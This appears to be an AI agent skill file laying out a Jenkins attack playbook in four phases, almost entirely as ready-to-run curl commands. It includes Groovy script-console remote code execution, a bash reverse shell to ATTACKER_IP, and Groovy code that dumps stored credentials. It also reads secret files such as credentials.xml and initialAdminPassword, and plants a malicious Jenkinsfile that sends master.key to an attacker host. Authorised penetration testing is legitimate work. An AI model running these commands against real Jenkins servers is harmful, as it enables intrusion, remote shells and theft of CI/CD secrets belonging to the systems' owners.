---
name: tech-jenkins
description: "Jenkins security testing — unauthenticated RCE via Groovy console, credential exposure, Jenkinsfile injection, CSRF bypass, build artifact secrets, pipeline abuse. Triggers: 'jenkins', 'jenkins security', 'jenkins pentest', 'jenkins rce', 'jenkins groovy', 'jenkins credential', 'jenkins exploit', 'ci cd security', 'jenkinsfile injection'."
---

# Jenkins Security Testing

Exploit Jenkins CI/CD for credential theft and code execution.

---

## Phase 1: Discovery & Enumeration

```bash
TARGET="http://TARGET:8080"

# Detect Jenkins:
curl -s -I "$TARGET/" | grep -i "X-Jenkins\|X-Hudson"
curl -s "$TARGET/api/json" | jq '. | {version: .version, mode: .mode, useSecurity: .useSecurity}'

# Unauthenticated API:
curl -s "$TARGET/api/json?pretty=true" | tee output/jenkins_api.txt
curl -s "$TARGET/api/json?depth=1&tree=jobs[name,url]" | jq '.jobs[].name' | tee output/jenkins_jobs.txt

# Build artifacts (may contain secrets):
curl -s "$TARGET/api/json?depth=2&tree=jobs[name,builds[artifacts[fileName,relativePath]]]" | \
  jq '.jobs[].builds[].artifacts[].relativePath' | tee output/jenkins_artifacts.txt
```

---

## Phase 2: Script Console RCE

```bash
TARGET="http://TARGET:8080"

# Unauthenticated script console (critical misconfiguration):
# Check if accessible:
curl -s "$TARGET/script" | grep -i "Groovy\|Script Console" && echo "SCRIPT CONSOLE ACCESSIBLE"

# Execute command via Groovy:
curl -s -X POST "$TARGET/scriptText" \
  --data-urlencode 'script=println "id".execute().text' 2>/dev/null | tee output/jenkins_rce.txt

# Reverse shell via Groovy:
LHOST="ATTACKER_IP"
LPORT="4444"
curl -s -X POST "$TARGET/scriptText" \
  --data-urlencode "script=def cmd = ['/bin/bash', '-c', 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'].execute()" 2>/dev/null

# With authentication:
curl -s -X POST "$TARGET/scriptText" \
  --user "admin:password" \
  --data-urlencode 'script=println "whoami".execute().text' 2>/dev/null
```

---

## Phase 3: Credential Harvesting

```bash
TARGET="http://TARGET:8080"

# Extract stored credentials via Groovy:
curl -s -X POST "$TARGET/scriptText" \
  --user "admin:password" \
  --data-urlencode 'script=
import com.cloudbees.plugins.credentials.*
import jenkins.model.*
def creds = CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
  Jenkins.instance, null, null)
creds.each { c ->
  println("${c.id}:${c.username}:${c.password ?: (c.privateKey ?: "no-plaintext")}")
}' 2>/dev/null | tee output/jenkins_creds.txt

# Read secrets from filesystem:
curl -s -X POST "$TARGET/scriptText" \
  --user "admin:password" \
  --data-urlencode 'script=println new File("/var/jenkins_home/secrets/initialAdminPassword").text' 2>/dev/null

# Master key + credentials.xml:
curl -s -X POST "$TARGET/scriptText" \
  --user "admin:password" \
  --data-urlencode 'script=println new File("/var/jenkins_home/credentials.xml").text' 2>/dev/null
```

---

## Phase 4: Build Pipeline Injection

```bash
TARGET="http://TARGET:8080"

# Malicious Jenkinsfile (if write access to repo):
cat << 'EOF' > /tmp/Jenkinsfile
pipeline {
  agent any
  stages {
    stage('Exfil') {
      steps {
        sh 'curl -s http://ATTACKER_IP/collect?data=$(cat /var/jenkins_home/secrets/master.key | base64)'
      }
    }
  }
}
EOF

# Or via API create job:
curl -s -X POST "$TARGET/createItem?name=test-job" \
  --user "admin:password" \
  -H "Content-Type: application/xml" \
  --data '<project><builders><hudson.tasks.Shell><command>id > /tmp/pwned</command></hudson.tasks.Shell></builders></project>' 2>/dev/null
```

---

## Output

Save to `output/`:
- `jenkins_jobs.txt` — all pipeline job names
- `jenkins_creds.txt` — extracted stored credentials
- `jenkins_rce.txt` — RCE command output

## Next Phase

→ `vuln-sensitive-exposure` for CI/CD secret exposure
→ `post-linux-privesc` after gaining Jenkins RCE
